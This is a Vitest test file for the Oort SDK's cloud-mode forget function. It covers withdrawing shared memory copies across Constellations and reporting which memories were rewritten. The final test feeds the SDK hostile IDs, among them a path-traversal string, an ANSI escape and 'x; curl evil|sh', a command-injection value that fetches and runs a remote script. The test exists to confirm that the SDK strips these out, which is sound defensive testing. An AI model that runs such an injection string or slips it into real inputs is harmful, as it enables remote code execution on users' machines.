import * as fs from 'node:fs';
import * as path from 'node:path';
import { describe, expect, it } from 'vitest';
import { tmpdir } from '../../test/helpers.js';
import { fakeCloud, fakeMemory, type FakeCloud } from '../../test/helpers/fake-cloud.js';
import { createOortWith } from './create.js';

/**
 * `oort.forget(id, { everywhere: true })` maps the same answer as `oort forget --everywhere`
 * (CON-67): the Constellations withdrawn, those with a removal request, and those not reached.
 */
const ID = '55555555-6666-4777-8888-999999999999';
const CORE = 'c_aaaaaaaaaaaaaaaa';
const CHECKOUT = 'c_cccccccccccccccc';
const DESIGN = 'c_dddddddddddddddd';

async function cloud(over: (c: FakeCloud) => void = () => {}) {
  const root = tmpdir('oort-sdk-forget-');
  const cwd = path.join(root, 'project');
  fs.mkdirSync(cwd);
  const key = ['oort', 'sk', 'forget'.padEnd(43, 'F')].join('_');
  const c = fakeCloud(key);
  c.hive.enabled = true;
  for (const [id, name] of [
    [CORE, 'oort-core'],
    [CHECKOUT, 'checkout'],
    [DESIGN, 'design'],
  ] as const) {
    c.hive.constellations.set(id, { id, name, role: 'member', owner: false });
  }
  c.memories.set(ID, fakeMemory({ id: ID, text: 'Release on Tuesdays.' }));
  over(c);
  const env = { HOME: root, OORT_HOME: path.join(root, 'home'), OORT_NO_KEYCHAIN: '1' };
  const oort = await createOortWith(
    { mode: 'cloud', cwd, env: { ...env, OORT_API_KEY: key }, fetch: c.fetch, keySources: ['env'] },
    {},
  );
  return { oort, c };
}

const copyIn = (c: FakeCloud, cid: string) =>
  c.hive.shared.set(`copy-${cid}`, {
    ...fakeMemory({ id: `copy-${cid}`, text: 'Release on Tuesdays.' }),
    constellation: cid,
    sourceId: ID,
  });

describe('oort.forget({ everywhere }) in Oort Cloud (CON-67)', () => {
  it('sdk.forget-everywhere-maps-withdrawn-requested-and-unreachable', async () => {
    const { oort, c } = await cloud((c) => {
      for (const cid of [CORE, CHECKOUT, DESIGN]) copyIn(c, cid);
      c.hive.withdrawOutcome.set(CHECKOUT, 'requested');
      c.hive.withdrawOutcome.set(DESIGN, 'unreachable');
    });
    expect(await oort.forget(ID.slice(0, 8), { everywhere: true })).toEqual({
      forgotten: ID,
      withdrawn: [CORE],
      requested: [CHECKOUT],
      unreachable: [DESIGN],
    });
    expect(c.seen).toContain(`DELETE /v1/memories/${ID}`);
    expect(c.memories.has(ID)).toBe(false);
    await oort.close();
  });

  it('sdk.forget-without-everywhere-is-unchanged-and-leaves-the-copies', async () => {
    const { oort, c } = await cloud((c) => copyIn(c, CORE));
    expect(await oort.forget(ID)).toEqual({ forgotten: ID });
    expect(c.hive.shared.size).toBe(1);
    // A memory already forgotten is still withdrawn everywhere by its full id.
    expect(await oort.forget(ID, { everywhere: true })).toEqual({
      forgotten: ID,
      withdrawn: [CORE],
      requested: [],
      unreachable: [],
    });
    expect(c.hive.shared.size).toBe(0);
    await expect(oort.forget(ID, { everywhere: true })).rejects.toMatchObject({
      code: 'not-found',
    });
    await oort.close();
  });

  it('sdk.forget-everywhere-outside-the-hive-beta-is-refused-before-anything-is-forgotten', async () => {
    const { oort, c } = await cloud((c) => {
      c.hive.enabled = false;
    });
    await expect(oort.forget(ID, { everywhere: true })).rejects.toMatchObject({
      code: 'refused',
      reason: 'hive-not-enabled',
    });
    expect(c.memories.has(ID)).toBe(true);
    await oort.close();
  });
});

// Local mode refuses `everywhere` as cloud-only: contract/sdk/cases/ids.json covers it.

describe('oort.forget in Oort Cloud reports what it rewrote (CON-161)', () => {
  const LATER = '66666666-7777-4888-8999-aaaaaaaaaaaa';
  const NEXT = '77777777-8888-4999-8aaa-bbbbbbbbbbbb';

  it('sdk.cloud-forget-lists-rewritten-and-notRewritten-as-local-mode-does', async () => {
    const { oort } = await cloud((c) => {
      c.forgetAnswer = {
        rewritten: [LATER],
        notRewritten: [NEXT],
        reasons: { [NEXT]: 'quota' },
      };
    });
    expect(await oort.forget(ID)).toEqual({
      forgotten: ID,
      rewritten: [LATER],
      notRewritten: [NEXT],
    });
    await oort.close();
  });

  it('sdk.cloud-forget-everywhere-lists-them-too', async () => {
    const { oort } = await cloud((c) => {
      copyIn(c, CORE);
      c.forgetAnswer = { rewritten: [LATER], notRewritten: [NEXT], reasons: { [NEXT]: 'timeout' } };
    });
    expect(await oort.forget(ID, { everywhere: true })).toEqual({
      forgotten: ID,
      rewritten: [LATER],
      notRewritten: [NEXT],
      withdrawn: [CORE],
      requested: [],
      unreachable: [],
    });
    await oort.close();
  });

  it('sdk.cloud-forget-with-empty-lists-leaves-the-fields-out-as-local-mode-does', async () => {
    const { oort } = await cloud();
    expect(await oort.forget(ID)).toEqual({ forgotten: ID });
    await oort.close();
  });

  it('sdk.cloud-forget-on-an-oort-cloud-from-before-rewrites-or-an-odd-answer-claims-nothing', async () => {
    for (const answer of [
      'pre-rewrite' as const,
      { rewritten: 'yes', notRewritten: 7, reasons: null },
      { rewritten: [LATER, 3], notRewritten: [LATER] },
    ]) {
      const { oort, c } = await cloud((c) => {
        c.forgetAnswer = answer;
      });
      const r = await oort.forget(ID);
      expect(r.forgotten).toBe(ID);
      expect(r.rewritten).toBeUndefined();
      expect(c.memories.has(ID)).toBe(false);
      await oort.close();
    }
    const { oort } = await cloud((c) => {
      copyIn(c, CORE);
      c.forgetAnswer = 'pre-rewrite';
    });
    expect(await oort.forget(ID, { everywhere: true })).toEqual({
      forgotten: ID,
      withdrawn: [CORE],
      requested: [],
      unreachable: [],
    });
    await oort.close();
  });

  it('sdk.cloud-forget-never-returns-an-id-that-is-not-a-memory-id (CON-161)', async () => {
    const { oort } = await cloud((c) => {
      c.forgetAnswer = {
        rewritten: ['..', LATER, 'x; curl evil|sh'],
        notRewritten: ['\u001b[31m', NEXT, 7],
      };
    });
    expect(await oort.forget(ID)).toEqual({
      forgotten: ID,
      rewritten: [LATER],
      notRewritten: [NEXT],
      notRewrittenUnnamed: 2,
    });
    await oort.close();
  });
});
